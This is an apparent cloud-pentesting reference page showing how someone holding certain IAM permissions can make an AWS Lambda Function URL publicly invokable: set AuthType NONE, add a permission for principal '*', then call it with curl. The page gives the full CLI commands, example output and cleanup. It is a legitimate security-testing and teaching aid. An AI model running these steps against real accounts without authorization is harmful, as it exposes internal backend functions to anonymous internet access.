# AWS - Lambda Function URL Public Exposure (AuthType NONE + Public Invoke Policy)

Turn a private Lambda Function URL into a public unauthenticated endpoint by switching the Function URL AuthType to NONE and attaching a resource-based policy that grants lambda:InvokeFunctionUrl to everyone. This enables anonymous invocation of internal functions and can expose sensitive backend operations.

## Abusing it

- Pre-reqs: lambda:UpdateFunctionUrlConfig, lambda:CreateFunctionUrlConfig, lambda:AddPermission
- Region: us-east-1

### Steps
1) Ensure the function has a Function URL (defaults to AWS_IAM):
    ```
    aws lambda create-function-url-config --function-name $TARGET_FN --auth-type AWS_IAM || true
    ```

2) Switch the URL to public (AuthType NONE):
    ```
    aws lambda update-function-url-config --function-name $TARGET_FN --auth-type NONE
    ```

3) Add a resource-based policy statement to allow unauthenticated principals:
    ```
    aws lambda add-permission --function-name $TARGET_FN --statement-id ht-public-url --action lambda:InvokeFunctionUrl --principal "*" --function-url-auth-type NONE
    ```

4) Retrieve the URL and invoke without credentials:
    ```
    URL=$(aws lambda get-function-url-config --function-name $TARGET_FN --query FunctionUrl --output text)
    curl -sS "$URL"
    ```

### Impact
- The Lambda function becomes anonymously accessible over the internet.

### Example output (unauthenticated 200)

```
HTTP 200
https://e3d4wrnzem45bhdq2mfm3qgde40rjjfc.lambda-url.us-east-1.on.aws/
{"message": "HackTricks demo: public Function URL reached", "timestamp": 1759761979, "env_hint": "us-east-1", "event_keys": ["version", "routeKey", "rawPath", "rawQueryString", "headers", "requestContext", "isBase64Encoded"]}
```

### Cleanup

```
aws lambda remove-permission --function-name $TARGET_FN --statement-id ht-public-url || true
aws lambda update-function-url-config --function-name $TARGET_FN --auth-type AWS_IAM || true
```
